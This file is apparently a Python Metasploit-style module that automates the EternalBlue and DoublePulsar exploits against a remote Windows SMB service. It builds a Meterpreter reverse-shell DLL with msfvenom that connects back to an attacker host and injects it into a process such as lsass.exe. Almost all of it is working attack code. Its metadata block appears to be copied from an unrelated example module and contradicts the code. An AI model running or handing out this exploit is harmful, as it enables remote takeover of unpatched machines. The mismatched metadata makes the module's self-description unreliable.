#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# standard modules
import logging
import subprocess
import os
from rich.console import Console
console = Console()

# extra modules
dependencies_missing = False
try:
    import requests
except ImportError:
    dependencies_missing = True

class EternalBlueExploit:
    def __init__(self, rhost, rport, lhost, lport, payload, eternalblue_path, doublepulsar_path, wine_path, dll_name, process_inject, timeout, targetarchitecture):
        self.rhost = rhost
        self.rport = rport
        self.lhost = lhost
        self.lport = lport
        self.payload = payload
        self.eternalblue_path = eternalblue_path
        self.doublepulsar_path = doublepulsar_path
        self.wine_path = wine_path
        self.dll_name = dll_name
        self.process_inject = process_inject
        self.timeout = timeout
        self.targetarchitecture = targetarchitecture

    def exploit(self):
        console.print('[bold blue][+] [white not bold]Generating Eternalblue XML data')
        self.copy_and_modify_xml(f'{self.eternalblue_path}/Eternalblue-2.2.0.Skeleton.xml', f'{self.eternalblue_path}/Eternalblue-2.2.0.xml')

        objective = "WIN72K8R2" if any(x in self.rhost for x in ['7', '2008', 'Vista']) else "XP"
        self.modify_xml(f'{self.eternalblue_path}/Eternalblue-2.2.0.xml', '%TARGET%', objective)

        console.print('[bold blue][+] [white not bold]Generating Doublepulsar XML data')
        self.copy_and_modify_xml(f'{self.doublepulsar_path}/Doublepulsar-1.3.1.Skeleton.xml', f'{self.doublepulsar_path}/Doublepulsar-1.3.1.xml')
        dllpayload = os.path.join(self.wine_path, self.dll_name).replace('/', '\\/')
        self.modify_xml(f'{self.doublepulsar_path}/Doublepulsar-1.3.1.xml', '%DLLPAY%', dllpayload)
        self.modify_xml(f'{self.doublepulsar_path}/Doublepulsar-1.3.1.xml', '%PROCESSINJECT%', self.process_inject)

        self.generate_payload_dll()

        console.print('[bold blue][+] [white not bold]Launching Eternalblue...')
        output = subprocess.getoutput(f'cd {self.eternalblue_path}; wine Eternalblue-2.2.0.exe')
        if "Pwned!" in output:
            console.print("[bold green][+] [white not bold]Pwned! Eternalblue success!")
        elif "Backdoor returned code: 10 - Success!" in output:
            console.print("[bold green][+] [white not bold]Backdoor is already installed")
        else:
            console.print("[bold red][-] [white not bold]Error: Are you sure it's vulnerable?")

        console.print('[bold blue][+] [white not bold]Launching Doublepulsar...')
        output2 = subprocess.getoutput(f'cd {self.doublepulsar_path}; wine Doublepulsar-1.3.1.exe')
        if "Backdoor returned code: 10 - Success!" in output2:
            console.print("[bold green][+] [white not bold]Remote code executed... 3... 2... 1...")
        else:
            console.print("[bold red][-] [white not bold]Error: Something went wrong!")
    def generate_payload_dll(self):
        console.print("[bold blue][+] [white not bold]Generating payload DLL for Doublepulsar")

        # إنشاء الأمر لـ msfvenom
        payload_cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={self.lhost} LPORT={self.lport} -f dll -o {os.path.join(self.wine_path, self.dll_name)}"
        
        # تنفيذ الأمر
        subprocess.run(payload_cmd, shell=True, check=True)
        console.print(f"[bold blue][+] [white not bold]Writing DLL in {os.path.join(self.wine_path, self.dll_name)}")
    def copy_and_modify_xml(self, src, dst):
        with open(src, 'r') as file:
            xml_data = file.read()

        xml_data = xml_data.replace('%RHOST%', self.rhost)
        xml_data = xml_data.replace('%RPORT%', self.rport)
        xml_data = xml_data.replace('%TIMEOUT%', str(self.timeout))

        with open(dst, 'w') as file:
            file.write(xml_data)

    def modify_xml(self, file_path, pattern, replacement):
        with open(file_path, 'r') as file:
            xml_data = file.read()

        xml_data = xml_data.replace(pattern, replacement)

        with open(file_path, 'w') as file:
            file.write(xml_data)

# Metadata
metadata = {
    'name': 'Python Module Example',
    'description': '''
        Python communication with msfconsole.
    ''',
    'authors': [
        'Jacob Robles'
    ],
    'date': '2018-03-22',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://www.rapid7.com/blog/post/2017/12/28/regifting-python-in-metasploit/'},
        {'type': 'aka', 'ref': 'Coldstone'}
    ],
    'type': 'remote_exploit_cmd_stager',
    'targets': [
        {'platform': 'linux', 'arch': 'x86'}
    ],
    'payload': {
        'command_stager_flavor': 'curl',
    },
    'options': {
        'targeturi': {'type': 'string', 'description': 'The base path', 'required': True, 'default': '/'},
        'rhost': {'type': 'address', 'description': 'Target address', 'required': True, 'default': None},
        'rport': {'type': 'string', 'description': 'Target port', 'required': False, 'default': '445'},
        'lhost': {'type': 'address', 'description': 'Local host for reverse connection', 'required': False, 'default': '192.168.1.100'},
        'lport': {'type': 'string', 'description': 'Local port for reverse connection', 'required': False, 'default': '4444'},
        'payload': {'type': 'string', 'description': 'Payload DLL file name', 'required': False, 'default': 'payload.dll'},
        'eternalblue_path': {'type': 'string', 'description': 'Path to Eternalblue', 'required': False, 'default': '/path/to/eternalblue'},
        'doublepulsar_path': {'type': 'string', 'description': 'Path to Doublepulsar', 'required': False, 'default': '/path/to/doublepulsar'},
        'wine_path': {'type': 'string', 'description': 'WINE drive_c path', 'required': False, 'default': '/path/to/wine'},
        'dll_name': {'type': 'string', 'description': 'Name of the DLL file to use', 'required': False, 'default': 'mydll.dll'},
        'process_inject': {'type': 'string', 'description': 'Name of process to inject into', 'required': False, 'default': 'lsass.exe'},
        'timeout': {'type': 'integer', 'description': 'Timeout for the exploit in seconds', 'required': False, 'default': 60},
        'targetarchitecture': {'type': 'enum', 'description': 'Target Architecture', 'required': True, 'default': 'x86', 'values': ['x86', 'x64']},
        'command': {'type': 'string', 'description': 'The command to execute via the q GET parameter', 'required': True}
    },
}

def run(args):
    if dependencies_missing:
        logging.error('Module dependency (requests) is missing, cannot continue')
        return

    exploit = EternalBlueExploit(
        rhost=args['rhost'],
        rport="445",
        lhost=args['lhost'],
        lport="4444",
        payload="payload.dll",
        eternalblue_path="/root/Eternalblue-Doublepulsar-Metasploit/deps/",
        doublepulsar_path="/root/Eternalblue-Doublepulsar-Metasploit/deps/",
        wine_path="/root/.wine/drive_c/",
        dll_name="payload.dll",
        process_inject="explorer.exe",
        timeout=60,
        targetarchitecture="x86"
    )
    exploit.exploit()

   

